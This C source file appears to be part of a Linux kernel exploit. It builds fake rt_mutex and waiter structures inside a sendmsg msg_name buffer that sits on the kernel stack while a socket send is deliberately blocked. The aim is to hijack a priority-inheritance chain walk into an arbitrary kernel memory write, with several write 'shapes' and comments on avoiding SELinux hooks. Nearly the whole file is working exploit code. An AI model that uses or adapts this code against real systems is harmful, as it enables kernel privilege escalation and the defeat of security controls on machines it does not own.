#include "common.h"

#include <sys/socket.h>
#include <sys/time.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <unistd.h>

#ifndef SENDMSG_CARRIER_TIMEOUT_MS
#define SENDMSG_CARRIER_TIMEOUT_MS 300
#endif
#ifndef SENDMSG_CARRIER_SNDBUF
#define SENDMSG_CARRIER_SNDBUF 4096
#endif

static int make_blocked_pair(int fds[2]) {
  /* CARRIER_UNIX: use a unix stream socket instead of loopback TCP.  The
   * syscall frame layout is identical, but SELinux's socket_sock_rcv_skb
   * hook returns immediately for non-INET families, so a permissive-state
   * write does not push our own packets through the strict netlabel /
   * secmark path (which is what the always_check_network capability turns
   * on). */
  const char *unixenv = getenv("CARRIER_UNIX");
  if (unixenv && *unixenv && atoi(unixenv)) {
    int sv[2];
    if (socketpair(AF_UNIX, SOCK_STREAM, 0, sv) != 0) return -1;
    int sndbuf = SENDMSG_CARRIER_SNDBUF;
    setsockopt(sv[0], SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
    struct timeval tv;
    tv.tv_sec = 0;
    tv.tv_usec = SENDMSG_CARRIER_TIMEOUT_MS * 1000;
    setsockopt(sv[0], SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
    int flags = fcntl(sv[0], F_GETFL, 0);
    if (flags < 0) flags = 0;
    fcntl(sv[0], F_SETFL, flags | O_NONBLOCK);
    static unsigned char ufill[0x20000];
    memset(ufill, 0x41, sizeof(ufill));
    while (send(sv[0], ufill, sizeof(ufill), MSG_NOSIGNAL) > 0) {
    }
    fcntl(sv[0], F_SETFL, flags);
    fds[0] = sv[0];
    fds[1] = sv[1];
    return 0;
  }

  int listen_fd = socket(AF_INET, SOCK_STREAM, 0);
  if (listen_fd < 0) return -1;

  struct sockaddr_in addr;
  memset(&addr, 0, sizeof(addr));
  addr.sin_family = AF_INET;
  addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
  addr.sin_port = 0;
  if (bind(listen_fd, (struct sockaddr *)&addr, sizeof(addr)) != 0 ||
      listen(listen_fd, 1) != 0) {
    close(listen_fd);
    return -1;
  }

  socklen_t alen = sizeof(addr);
  getsockname(listen_fd, (struct sockaddr *)&addr, &alen);

  int client = socket(AF_INET, SOCK_STREAM, 0);
  if (client < 0) {
    close(listen_fd);
    return -1;
  }
  if (connect(client, (struct sockaddr *)&addr, sizeof(addr)) != 0) {
    close(client);
    close(listen_fd);
    return -1;
  }
  int peer = accept(listen_fd, NULL, NULL);
  close(listen_fd);
  if (peer < 0) {
    close(client);
    return -1;
  }

  int one = 1;
  setsockopt(client, IPPROTO_TCP, TCP_NODELAY, &one, sizeof(one));
  int sndbuf = SENDMSG_CARRIER_SNDBUF;
  setsockopt(client, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));

  struct timeval tv;
  tv.tv_sec = 0;
  tv.tv_usec = SENDMSG_CARRIER_TIMEOUT_MS * 1000;
  setsockopt(client, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));

  int flags = fcntl(client, F_GETFL, 0);
  if (flags < 0) flags = 0;
  fcntl(client, F_SETFL, flags | O_NONBLOCK);

  static unsigned char fill[0x20000];
  memset(fill, 0x41, sizeof(fill));
  while (send(client, fill, sizeof(fill), MSG_NOSIGNAL) > 0) {
  }

  fcntl(client, F_SETFL, flags);
  fds[0] = client;
  fds[1] = peer;
  return 0;
}

int sendmsg_carrier_once(int seq, int *out_errno) {
  int fds[2] = {-1, -1};
  if (make_blocked_pair(fds) != 0) {
    if (out_errno) {
      *out_errno = errno;
    }
    return -1;
  }

  unsigned char name[128];
  memset(name, 0, sizeof(name));

  static unsigned char payload[0x10000];
  memset(payload, 0x42, sizeof(payload));

  struct iovec iov[8];
  memset(iov, 0, sizeof(iov));
  iov[0].iov_base = payload;
  iov[0].iov_len = sizeof(payload);

  size_t namelen = 32;

  if (pselect_custom_write == 7 && g_kstack_T) {
    /* Stack-only layout.  The kernel validates every iovec (length limit and
     * access_ok on the base), so no kernel pointer may live in iovstack.
     * All fake objects therefore go into msg_name, which is copied verbatim:
     *
     *   name[0x00] waiter->task        name[0x08] waiter->lock = fl
     *   fake_lock at name[0x10] (T-0x158): wait_lock, root=w0, leftmost=w0,
     *                                    owner=init_task|1
     *   fake_w0   at name[0x30] (T-0x138): pi_tree={target-8, child, 0},
     *                                    task=init_task, lock=fl
     * iov[0] blocks; iov[1..7] are zero-length. */
    uintptr_t T = g_kstack_T;
    uintptr_t fl = T - 0x158;      /* fake rt_mutex */
    uintptr_t w0 = T - 0x138;      /* fake top waiter */
    uintptr_t child = T - 0x170;   /* writable; low byte 0 => write value 0 */
    uintptr_t itask = text_addr(INIT_TASK);

    /* main waiter task = init_task so the owner==NULL early-return path
     * (wake_up_process(top_waiter->task)) is a no-op: idle is TASK_RUNNING. */
    put64(name, 0x00, itask);          /* waiter->task */
    put64(name, 0x08, fl);             /* waiter->lock */
    /* lock->wait_lock doubles as waiter->prio until step [7].  Setting it to
     * the victim's real prio makes rt_mutex_adjust_pi() bail before the
     * chain walk (safe diagnostic). */
    put64(name, 0x10, (uint64_t)env_int_range("STACK_PRIO", 0, 0, 255));
    put64(name, 0x18, w0);             /* lock->waiters.root (deadline) */
    put64(name, 0x20, w0);             /* lock->waiters.leftmost */
    /* Owner: empty_zero_page is an all-zero bss page, so it behaves as a
     * fake task whose prio/normal_prio/pi_* are 0 and rt_mutex_setprio()
     * takes its early return.  Independent of exact data-symbol offsets. */
    uintptr_t owner = env_flag("STACK_OWNER_ZERO", 0)
                          ? text_addr(EMPTY_ZERO_PAGE) : itask;
    /* STACK_OWNER_ADDR: use a task we leaked ourselves (our own task_struct)
     * as the fake lock owner.  The chain then links the fake waiter into that
     * task's pi_waiters instead of the global init_task one, so a stale node
     * can never poison an unrelated kernel path. */
    const char *oenv = getenv("STACK_OWNER_ADDR");
    if (oenv && *oenv)
      owner = (uintptr_t)strtoull(oenv, NULL, 0);
    put64(name, 0x28,                        /* lock->owner */
          env_flag("STACK_BAIL", 0) ? 0 : (owner | 1));
    put64(name, 0x30, 0);              /* w0 tree_entry */
    put64(name, 0x38, 0);
    put64(name, 0x40, 0);
    /* STACK_NOERASE: make fake_w0's pi_tree entry look empty so
     * rt_mutex_dequeue_pi() returns without touching the target. */
    /* STACK_WRITE_STACK: aim the rb_erase write at a known-writable stack
     * slot, so the full chain can be validated without a data-symbol
     * address. */
    uintptr_t wpc = env_flag("STACK_WRITE_STACK", 0)
                        ? (T - 0x108) : (pselect_custom_target - 8);
    if (env_flag("STACK_ZERO_WRITE", 0)) {
      /* Zero-write shape.  With rb_left = rb_right = 0 the erase takes the
       * single-child path with no child: __rb_change_child stores a NULL at
       * (parent + 8), and an even parent colour makes 0x7648 `tbz` return
       * before any rebalancing.  Net effect: an arbitrary 8-byte zero write
       * at target, with no collateral store. */
      put64(name, 0x48, pselect_custom_target - 8); /* w0 pi_tree parent */
      put64(name, 0x50, 0);                         /* w0 pi_tree rb_right */
      put64(name, 0x58, 0);                         /* w0 pi_tree rb_left */
    } else if (env_flag("STACK_PARENT_WRITE", 0)) {
      /* Parent-write shape: the parent colour is target-8 and rb_right is
       * the value, so the kernel does *(target) = value.  The value must be
       * a writable kernel address because the erase also stores pc at it. */
      const char *vaddr = getenv("STACK_VALUE_ADDR");
      uintptr_t val = (vaddr && *vaddr)
                          ? (uintptr_t)strtoull(vaddr, NULL, 0) : 0;
      put64(name, 0x48, pselect_custom_target - 8); /* w0 pi_tree parent */
      put64(name, 0x50, val);                       /* w0 pi_tree rb_right */
      put64(name, 0x58, 0);                         /* w0 pi_tree rb_left */
    } else if (env_flag("STACK_CHILD_TARGET", 0)) {
      /* Inverted shape: the erased node's rb_right *is* the target, so the
       * kernel executes target->__rb_parent_color = pc.  pc is the value we
       * write; it must be 4-byte aligned (used as the fake parent node) and
       * its low byte should be 0 (enforcing byte -> 0).
       *
       * pc must NOT overlap anything live: __rb_change_child also stores the
       * target at pc+8, and with pc = T-0x170 that slot is the dangling
       * waiter's `task` field, which the chain later dereferences.  Default
       * stays on the stack slot; STACK_PARENT_OFF points pc at dead .bss
       * padding instead (e.g. 0x31b6800, after selinux_state). */
      uintptr_t pslot = child;
      const char *poff = getenv("STACK_PARENT_OFF");
      const char *paddr = getenv("STACK_PARENT_ADDR");
      if (poff && *poff) pslot = text_addr((uintptr_t)strtoull(poff, NULL, 0));
      else if (paddr && *paddr) pslot = (uintptr_t)strtoull(paddr, NULL, 0);
      put64(name, 0x48, env_flag("STACK_NOERASE", 0) ? (w0 + 0x18)
                          : (pslot | (uintptr_t)env_int_range("STACK_VALUE_OR", 0, 0, 3)));
      put64(name, 0x50, pselect_custom_target); /* w0 pi_tree rb_right */
      put64(name, 0x58, 0);                     /* w0 pi_tree rb_left */
    } else {
      put64(name, 0x48, env_flag("STACK_NOERASE", 0) ? (w0 + 0x18) : wpc);
      put64(name, 0x50, child);        /* w0 pi_tree rb_right */
      put64(name, 0x58, 0);            /* w0 pi_tree rb_left */
    }
    put64(name, 0x60, itask);          /* w0 task */
    put64(name, 0x68, fl);             /* w0 lock */
    put64(name, 0x70, 0);              /* w0 prio */
    put64(name, 0x78, 0);              /* w0 deadline */
    namelen = 128;

    pr_info("stack carrier: T=%#zx w0=%#zx lock=%#zx child=%#zx itask=%#zx\n",
            T, w0, fl, child, itask);
  } else {
    put64(name, 0x00,
          pselect_custom_write_enabled() ? fake_task : text_addr(INIT_TASK));
    put64(name, 0x08, fake_lock);
    for (int i = 1; i <= 4; i++) {
      iov[i].iov_base = payload;
      iov[i].iov_len = 1;
    }
  }

  struct msghdr mh;
  memset(&mh, 0, sizeof(mh));
  mh.msg_name = name;
  mh.msg_namelen = (int)namelen;
  mh.msg_iov = iov;
  mh.msg_iovlen = 8;
  mh.msg_control = NULL;
  mh.msg_controllen = 0;
  mh.msg_flags = 0;

  atomic_store(&main_route_delay_usec, 20000);
  atomic_store(&punch_consume_go, seq);

  errno = 0;
  int ret = (int)sendmsg(fds[0], &mh, MSG_NOSIGNAL);
  int saved = errno;

  atomic_store(&punch_consume_go, 0);
  close(fds[1]);
  close(fds[0]);

  if (out_errno) {
    *out_errno = saved;
  }
  return ret;
}
